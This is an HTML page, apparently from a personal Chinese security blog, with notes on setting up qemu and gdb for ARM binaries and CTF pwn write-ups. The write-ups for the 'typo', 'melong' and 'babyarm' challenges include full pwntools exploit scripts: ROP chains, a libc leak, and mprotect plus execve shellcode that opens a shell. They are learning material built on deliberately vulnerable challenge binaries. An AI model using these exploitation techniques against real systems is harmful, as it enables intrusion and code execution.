@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    arm的环境搭建+简单的例题 |
+    
+    The lair of C0yo7e</title>
+  
+    <link rel="shortcut icon" href="/images/time.png">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+    <link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+  
+  <script src="/js/pace.min.js"></script>
+</head>
+</html>
+<body>
+<main class="content">
+  <section class="outer">
+  
+
+<article id="post-arm的环境搭建-简单的例题" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      arm的环境搭建+简单的例题
+    </h1>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2020/02/07/arm的环境搭建-简单的例题/" class="article-date">
+  <time datetime="2020-02-07T14:54:19.000Z" itemprop="datePublished">2020-02-07</time>
+</a>
+        
+      </div>
+    
+
+    
+      
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+        <p>关于arm的东西我好像已经拖了将近一个月了，不能再拖下去了，先记一些吧，之后我陆续补坑看看</p>
+<h3 id="arm环境搭建"><a href="#arm环境搭建" class="headerlink" title="arm环境搭建"></a>arm环境搭建</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#安装qemu</span><br><span class="line">apt-get install qemu</span><br><span class="line">#更新一下</span><br><span class="line">sudo apt-get update</span><br><span class="line">#安装32位的依赖库</span><br><span class="line">sudo apt-get install -y gcc-arm-linux-gnueabi</span><br><span class="line">#运行32位的动态链接程序方法</span><br><span class="line">qemu-arm -L /usr/arm-linux-gnueabi ./文件</span><br><span class="line">#安装64位的依赖库</span><br><span class="line">sudo apt-get install -y gcc-aarch64-linux-gnu g++-aarch64-linux-gnu</span><br><span class="line">#运行64位的动态链接程序方法</span><br><span class="line">qemu-aarch64 -L /usr/aarch64-linux-gnu ./文件</span><br><span class="line">#安装gdb调试工具</span><br><span class="line">sudo apt-get install git gdb gdb-multiarch</span><br></pre></td></tr></table></figure>
+
+<a id="more"></a>
+
+
+<h2 id="32位的调试步骤："><a href="#32位的调试步骤：" class="headerlink" title="32位的调试步骤："></a>32位的调试步骤：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#运行32位的动态链接程序方法</span><br><span class="line">qemu-arm -L /usr/arm-linux-gnueabi ./文件</span><br><span class="line"></span><br><span class="line">#32位程序下断调试步骤</span><br><span class="line">1： qemu-arm -g 1234 -L /usr/arm-linux-gnueabi ./文件(窗口1)</span><br><span class="line">2： qemu-arm-static -g 1234 ./文件（窗口1）</span><br><span class="line"></span><br><span class="line">gdb-multiarch ./文件(窗口2)</span><br><span class="line">pwndbg&gt; target remote :1234</span><br><span class="line">pwndbg&gt; b *0x8bb0</span><br><span class="line">pwndbg&gt; c</span><br></pre></td></tr></table></figure>
+
+<h2 id="64位的调试步骤："><a href="#64位的调试步骤：" class="headerlink" title="64位的调试步骤："></a>64位的调试步骤：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#运行64位的动态链接程序方法</span><br><span class="line">qemu-aarch64 -L /usr/aarch64-linux-gnu ./文件</span><br><span class="line">#64位程序下断调试步骤</span><br><span class="line">qemu-aarch64 -g 1234 -L /usr/aarch64-linux-gnu ./文件(窗口1)</span><br><span class="line">gdb-multiarch ./文件(窗口2)</span><br><span class="line">pwndbg&gt; target remote :1234</span><br><span class="line">pwndbg&gt; b *0x8bb0</span><br><span class="line">pwndbg&gt; c</span><br></pre></td></tr></table></figure>
+
+<h2 id="起qemu的那个虚拟机"><a href="#起qemu的那个虚拟机" class="headerlink" title="起qemu的那个虚拟机"></a>起qemu的那个虚拟机</h2><p>（上面那些命令行好像更方便一点，这个的话可能每次打题都要起一次）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 -append &quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot; -net nic,macaddr=52:54:00:12:34:56 -net tap -nographic</span><br></pre></td></tr></table></figure>
+
+<h3 id="架构下的寄存器"><a href="#架构下的寄存器" class="headerlink" title="架构下的寄存器"></a>架构下的寄存器</h3><h2 id="64位的寄存器"><a href="#64位的寄存器" class="headerlink" title="64位的寄存器"></a>64位的寄存器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">x0~x7：传递子程序的参数和返回值，使用时不需要保存，多余的参数用堆栈传递，64位的返回结果保存在x0中。</span><br><span class="line">x8：用于保存子程序的返回地址，使用时不需要保存。</span><br><span class="line">x9~x15：临时寄存器，也叫可变寄存器，子程序使用时不需要保存。</span><br><span class="line">x16~x17：子程序内部调用寄存器（IPx），使用时不需要保存，尽量不要使用。</span><br><span class="line">x18：平台寄存器，它的使用与平台相关，尽量不要使用。</span><br><span class="line">x19~x28：临时寄存器，子程序使用时必须保存。</span><br><span class="line">x29：帧指针寄存器（FP），用于连接栈帧，使用时必须保存。</span><br><span class="line">x30：链接寄存器（LR），用于保存子程序的返回地址。</span><br><span class="line">x31：堆栈指针寄存器（SP），用于指向每个函数的栈顶。</span><br></pre></td></tr></table></figure>
+
+<h2 id="32位的寄存器"><a href="#32位的寄存器" class="headerlink" title="32位的寄存器"></a>32位的寄存器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">r0-r3: 用于函数调用入参，32位最多支持4个入参，当多于4个入参是将通过压栈方式进行传递。栈的方式为先进后出，估参数大于4个时 入栈顺序与参数顺序正好相反，子程序返回前无需回复R0~R3的值,32位的返回结果保存在r0中。</span><br><span class="line">r4-r11: 用于保存局部变量。函数进入后首先第一件事就是将R4~R11入栈保存(看局部变量用了多少个，不一定所有都需要入栈)，然后才能用于本函数使用，本函数使用完之后，要将之前栈保存的数据恢复到R4~R11中</span><br><span class="line">r7: 系统调用时，存放系统调用号，有时也用于作为FP使用。FP又叫frame pointer即栈基指针，主要在函数中保存当前函数的栈起始位置，用于堆栈回溯。</span><br><span class="line">r13: SP，即栈指针寄存器，主要用于指向当前程序栈顶，配合指令pop/push等。</span><br><span class="line">r14: LR，即链接寄存器，主要用于存放函数的返回地址，即当前函数返回时，知道自己该回到哪儿去继续运行。</span><br><span class="line">r15: PC，即程序寄存器，主要用于存放CPU取指的地址。是取值地址，不是当前运行地址。</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/02/07/arm的环境搭建-简单的例题/1.png" alt></p>
+<h3 id="arm的简单例题"><a href="#arm的简单例题" class="headerlink" title="arm的简单例题"></a>arm的简单例题</h3><h2 id="32位简单的arm"><a href="#32位简单的arm" class="headerlink" title="32位简单的arm"></a>32位简单的arm</h2><p>就是道很简单的ret2text<br>用命令行先连上qume和gdb，让它跑起来</p>
+<p><img src="/2020/02/07/arm的环境搭建-简单的例题/2.png" alt></p>
+<p><img src="/2020/02/07/arm的环境搭建-简单的例题/3.png" alt></p>
+<p>然后就可以调了<br>我们在gdb里生成字符串，自己输的话，计算长度可能会出bug<br>调出长度之后就去找程序有没有system(‘/bin/sh’)<br>这个东西去了函数符号表，我不会那个rizzo的恢复，所以直接找字符’/bin/sh’</p>
+<p><img src="/2020/02/07/arm的环境搭建-简单的例题/4.png" alt><br>会发现它在一个函数里<br>这个长得就很像execve，f5进去看一下</p>
+<p><img src="/2020/02/07/arm的环境搭建-简单的例题/5.png" alt><br>然后这个名字就很像了，再加上系统调用号也出来了<br>（经大佬指点才知道arm32中系统调用号是在r7里的）<br>点开汇编，发现它确实是<br><img src="/2020/02/07/arm的环境搭建-简单的例题/6.png" alt><br>然后我们就用syscall来做这题吧<br>syscall要用的话，肯定是要r1、 r2的参数都得为null的<br>所以我们去找gadget<br><img src="/2020/02/07/arm的环境搭建-简单的例题/7.png" alt><br>r0的就只有一个，然后还有相关的r1和r7都能对应找到<br>唯独发现没有pop r2的gadget，所以我们考虑一下xor或者是mov（xor好像在arm里没有）<br><img src="/2020/02/07/arm的环境搭建-简单的例题/8.png" alt><br>这里面对r2有赋值为零的gadget，我们可以用一波，但事实它还自带三个pop，为了堆栈平衡，我们就还得填充三个0<br>差不多就可以写exp了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">if sys.argv[1] == &quot;l&quot;:</span><br><span class="line">    io = process(&quot;./typo&quot;, timeout = 2)</span><br><span class="line">elif sys.argv[1] == &quot;d&quot;:</span><br><span class="line">    io = process([&quot;qemu-arm&quot;, &quot;-g&quot;, &quot;1234&quot;, &quot;./typo&quot;])</span><br><span class="line">else:</span><br><span class="line">    io = remote(&quot;pwn2.jarvisoj.com&quot;, 9888, timeout = 2)</span><br><span class="line"></span><br><span class="line">mov_r2 = 0x0004df00 #mov r2, #0 ; mov r0, r2 ; pop &#123;r3, r4, r5, pc&#125;</span><br><span class="line">syscall = 0x0002165C</span><br><span class="line">pop_r3_r7 =0x0000a958</span><br><span class="line">pop_r0_r4 = 0x00020904 #pop &#123;r0, r4, pc&#125;</span><br><span class="line">pop_r1 = 0x00068bec</span><br><span class="line">pop_r7 = 0x00014068#0x00008160</span><br><span class="line">binsh = 0x0006c384</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*112 </span><br><span class="line">payload += p32(mov_r2)</span><br><span class="line">payload += p32(0)+p32(0)+p32(0)</span><br><span class="line">payload += p32(pop_r0_r4)</span><br><span class="line">payload += p32(binsh)+p32(0)</span><br><span class="line">payload += p32(pop_r7)+p32(0xb)</span><br><span class="line">payload += p32(pop_r1)+p32(0)</span><br><span class="line">payload += p32(syscall)</span><br><span class="line"># r0-&gt;binsh  r1,r2-&gt;0  arm的系统调用号存在r7</span><br><span class="line"># io.sendline(&apos;\n&apos;)</span><br><span class="line">io.sendlineafter(&quot;if you want to quit\n&quot;, &apos;\n&apos;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>然后我碰到一个很难受的bug，本地加了context.log_level = “debug”是能跑通的，但是不加就不行了，为啥呢，害，到时候再探究探究</p>
+<h1 id="melong（arm32位）"><a href="#melong（arm32位）" class="headerlink" title="melong（arm32位）"></a>melong（arm32位）</h1><p>这题是个 简单的栈题，我被难倒的地方是offset到底是什么<br>这题的栈溢出存在于write那个函数里的read<br>用-1绕过len，使我们可以输入很多的东西，可以构造rop链<br><img src="/2020/02/07/arm的环境搭建-简单的例题/9.png" alt><br>write函数里面长这样，我们到出去看a2是什么<br><img src="/2020/02/07/arm的环境搭建-简单的例题/10.png" alt><br><img src="/2020/02/07/arm的环境搭建-简单的例题/11.png" alt><br>发现是v4，去找他的偏移，发现是0x54，就一般在我的印象里，偏移应该是ebp+0x54，所以应该再加一个4的，但是看了很多exp都是用的0x54</p>
+<p>发现我们需要覆盖到dd4的地方 r11（d14-&gt;exid即下一个函数的地址存放处）而开始覆盖是在d80，offset为84 即 0x54（但是我并没有在ida里找到那段代码）<br><img src="/2020/02/07/arm的环境搭建-简单的例题/12.png" alt><br>这个是我写入100个字符之后，触发exit之后报错之后，计算出来的 偏移，就是0x54，这题也确实比较独特，ida里的偏移果然不一定是对的</p>
+<p>然后用put的方法leak的话呢，本来以为会比较快捷方便一点，但是这里最想不到的是，进入了puts函数之后，结尾时会否存在pop，pc又在哪里赋值，在傻傻地用正常栈的方法试了一遍发现不行，选择跟进去看看puts里面的玄机</p>
+<p>发现在末尾它有一个pop<br><img src="/2020/02/07/arm的环境搭建-简单的例题/13.png" alt><br>所以要想回到主函数还要填充些值进寄存器里</p>
+<p>exp大概就如下了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level =&apos;DEBUG&apos;</span><br><span class="line">import sys</span><br><span class="line">context.binary = &quot;./melong&quot;</span><br><span class="line"></span><br><span class="line">if sys.argv[1] == &quot;r&quot;:</span><br><span class="line">    p = remote(&quot;localhost&quot;, 9999)</span><br><span class="line">elif sys.argv[1] == &quot;l&quot;:</span><br><span class="line">    p = process([&quot;qemu-arm&quot;, &quot;-L&quot;, &quot;./&quot;, &quot;./melong&quot;])</span><br><span class="line">else:</span><br><span class="line">    p = process([&quot;qemu-arm&quot;, &quot;-g&quot;, &quot;1234&quot;, &quot;-L&quot;, &quot;./&quot;, &quot;./melong&quot;])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(&quot;./melong&quot;, checksec = False)</span><br><span class="line">libc = ELF(&quot;./lib/libc.so.6&quot;, checksec = False)</span><br><span class="line"></span><br><span class="line">def check(height,weight):</span><br><span class="line">	p.sendlineafter(&quot;number:&quot;,&quot;1&quot;)</span><br><span class="line">	p.sendlineafter(&quot;height(meters) :&quot;,str(height))</span><br><span class="line">	p.sendlineafter(&quot;weight(kilograms) :&quot;,str(weight))</span><br><span class="line"></span><br><span class="line">def exercise():</span><br><span class="line">	p.sendlineafter(&quot;number:&quot;,&quot;2&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def register(num):</span><br><span class="line">	p.sendlineafter(&quot;number:&quot;,&quot;3&quot;)</span><br><span class="line">	p.sendlineafter(&quot;training?&quot;,str(num))</span><br><span class="line"></span><br><span class="line">def write(content):</span><br><span class="line">	p.sendlineafter(&quot;number:&quot;,&quot;4&quot;)</span><br><span class="line">	# p.sendlineafter(&apos;\n&apos;,content)</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def out():</span><br><span class="line">	p.sendlineafter(&quot;number:&quot;,&quot;6&quot;)</span><br><span class="line"></span><br><span class="line">pop = 0x00011bbc</span><br><span class="line">check(1.58,49.8)</span><br><span class="line">register(-1)</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x54+p32(pop) + p32(elf.got[&apos;puts&apos;]) + p32(elf.sym[&apos;puts&apos;]) +p32(0)*7+p32(elf.sym[&apos;main&apos;])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write(payload)</span><br><span class="line">out()</span><br><span class="line">p.recvuntil(&quot;See you again :)\n&quot;)</span><br><span class="line"></span><br><span class="line">put_addr = u32(p.recvn(4))</span><br><span class="line">print hex(put_addr)</span><br><span class="line"></span><br><span class="line">libc.address = put_addr - libc.sym[&apos;puts&apos;]</span><br><span class="line">print hex(libc.address)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">check(1.58,49.8)</span><br><span class="line">register(-1)</span><br><span class="line"></span><br><span class="line">pay = &quot;a&quot;*0x54 + p32(pop) + p32(next(libc.search(&quot;/bin/sh&quot;))) + p32(libc.sym[&apos;system&apos;])</span><br><span class="line"></span><br><span class="line">write(pay)</span><br><span class="line">out()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="64位简单题"><a href="#64位简单题" class="headerlink" title="64位简单题"></a>64位简单题</h2><h1 id="2018-上海大学生网络安全大赛-babyarm"><a href="#2018-上海大学生网络安全大赛-babyarm" class="headerlink" title="2018 上海大学生网络安全大赛 babyarm"></a>2018 上海大学生网络安全大赛 babyarm</h1><p>开了nx<br><img src="/2020/02/07/arm的环境搭建-简单的例题/14.png" alt></p>
+<p>一眼看到了mprotect函数，一般呢有它就是改权限然后写shellcode了，上一次用这个好像是level5，emmmm碰巧这题好像也可以用这个方法做，听说是有三个参数的函数要调用和写参的话就用csu这种方法比较简单</p>
+<p>我们知道这个题目有两层输入，第一层是不存在溢出的，第二处才存在，所以我们在第二处用csu的方法再调用回存储第一处输入的位置<br>所以我们找一下万能gadget</p>
+<p>我们发现mprotect的几个参数传递过程如下</p>
+<p><img src="/2020/02/07/arm的环境搭建-简单的例题/15.png" alt></p>
+<p>mprotect是从0x411000开始的，题目中输入的地址为0x411068，所以可以让mprotect来改权限（这题好像和oj leve5不一样的是它不需要借助bss段了</p>
+<p><img src="/2020/02/07/arm的环境搭建-简单的例题/16.png" alt></p>
+<p>关于gadget的传参</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ret     跳转到 x30 寄存器，一般在函数的末尾会恢复函数的返回地址到 x30 寄存器</span><br><span class="line"></span><br><span class="line">ldp x19, x20, [sp, #0x10]     从 sp+0x10 的位置读 0x10 字节，按顺序放入 x19, x20 寄存器</span><br><span class="line"></span><br><span class="line">ldp x29, x30, [sp], #0x40      从 sp 的位置读 0x10 字节，按顺序放入 x29, x30 寄存器，然后 sp += 0x40</span><br><span class="line"></span><br><span class="line">MOV X1, X0  寄存器X0的值传给X1</span><br><span class="line"></span><br><span class="line">blr x3      跳转到由Xm目标寄存器指定的地址处，同时将下一条指令存放到X30寄存器中</span><br></pre></td></tr></table></figure>
+
+<p>所以x29和x30会在x19和x20前面布置<br>x30是存放下一个执行的地址，相当于ebp吧<br>pc相当于rdi<br>所以我们布置rop：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">payload = &apos;a&apos;*72 </span><br><span class="line">payload += p64(0x04008cc)</span><br><span class="line">payload += p64(0) #x29</span><br><span class="line">payload += p64(0x04008ac) #x30 ret-&gt;next pc</span><br><span class="line">payload += p64(0) #19</span><br><span class="line">payload += p64(0) #20</span><br><span class="line">payload += p64(bss) #21   mprotect_addr </span><br><span class="line">payload += p64(0x7) #22  x2</span><br><span class="line">payload += p64(0x1000) #23  x1</span><br><span class="line">payload += p64(0x411000) #24  x0</span><br><span class="line">payload += p64(0) #next x29</span><br><span class="line">payload += p64(bss+0x10) #next x30</span><br></pre></td></tr></table></figure>
+
+<p>先布置完cc处的栈，然后跳回ac里执行mprotect，会再执行一遍cc，我们覆盖x30的内容为我们想它跳到的地址即可</p>
+<p>完整的exp：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.binary = &quot;./pwn&quot;</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">if sys.argv[1] == &quot;l&quot;:</span><br><span class="line">    p = process([&quot;qemu-aarch64&quot;, &quot;-L&quot;, &quot;/usr/aarch64-linux-gnu&quot;, &quot;./pwn&quot;])</span><br><span class="line">elif sys.argv[1] == &quot;d&quot;:</span><br><span class="line">    p = process([&quot;qemu-aarch64&quot;, &quot;-g&quot;, &quot;1234&quot;, &quot;-L&quot;, &quot;/usr/aarch64-linux-gnu&quot;, &quot;./pwn&quot;])</span><br><span class="line">else:</span><br><span class="line">    p = remote(&quot;106.75.126.171&quot;, 33865)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bss = 0x00411068</span><br><span class="line">call_mprotect = 0x0400600</span><br><span class="line">shellcode = asm(shellcraft.execve(&quot;/bin/sh&quot;))</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;Name:&quot;)</span><br><span class="line">pay = p64(0x04007e0) #call_mprotect</span><br><span class="line">pay += p64(0)</span><br><span class="line">pay += shellcode   #must in addr+0x10</span><br><span class="line">p.sendline(pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*72 </span><br><span class="line">payload += p64(0x04008cc)</span><br><span class="line">payload += p64(0) #x29</span><br><span class="line">payload += p64(0x04008ac) #x30 ret-&gt;next pc</span><br><span class="line">payload += p64(0) #19</span><br><span class="line">payload += p64(0) #20</span><br><span class="line">payload += p64(bss) #21   mprotect  </span><br><span class="line">payload += p64(0x7) #22  x2</span><br><span class="line">payload += p64(0x1000) #23  x1</span><br><span class="line">payload += p64(0x411000) #24  x0</span><br><span class="line">payload += p64(0) #next x29?</span><br><span class="line">payload += p64(bss+0x10) #next x30</span><br><span class="line">sleep(0.5)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>参考链接：<br>        <a href="https://gdufs-king.github.io/2019/11/06/32%E4%BD%8D%E3%80%8164%E4%BD%8D%E4%B8%8B%E7%9A%84arm_pwn/" target="_blank" rel="noopener">https://gdufs-king.github.io/2019/11/06/32%E4%BD%8D%E3%80%8164%E4%BD%8D%E4%B8%8B%E7%9A%84arm_pwn/</a><br>        <a href="http://yoursite.com/2018/11/05/2018-11-5-%E3%80%90%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E3%80%91baby_arm%E5%A4%8D%E7%8E%B0/">http://yoursite.com/2018/11/05/2018-11-5-%E3%80%90%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E3%80%91baby_arm%E5%A4%8D%E7%8E%B0/</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/02/07/arm的环境搭建-简单的例题/" data-id="ck6cfs3js0002c0swrrc7je4m"
+         class="article-share-link">Share</a>
+      
+    </footer>
+
+  </div>
+
+  
+    
+  <nav class="article-nav">
+    
+    
+      <a href="/2020/02/07/fastbinin-attack/" class="article-nav-link">
+        <strong class="article-nav-caption">Olde posts</strong>
+        <div class="article-nav-title">fastbinin_attack</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+    
+  <div class="gitalk" id="gitalk-container"></div>
+  <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+  <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+  <script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+  <script type="text/javascript">
+    var gitalk = new Gitalk({
+      clientID: '',
+      clientSecret: '',
+      repo: '',
+      owner: 'C0yo7e',
+      admin: ['C0yo7e'],
+      // id: location.pathname,      // Ensure uniqueness and length less than 50
+      id: md5(location.pathname),
+      distractionFreeMode: false,  // Facebook-like distraction free mode
+      pagerDirection: 'last'
+    })
+
+  gitalk.render('gitalk-container')
+  </script>
+
+  
+
+</article>
+
+
+
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2020 The lair of C0yo7e</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+
+<aside class="sidebar sidebar-specter">
+  
+    <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/time.png" alt="The lair of C0yo7e"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">Home</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">Archives</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/gallery">Gallery</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/about">About</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="搜索">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+          <i class="fe fe-feed"></i>
+        </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+  </aside>
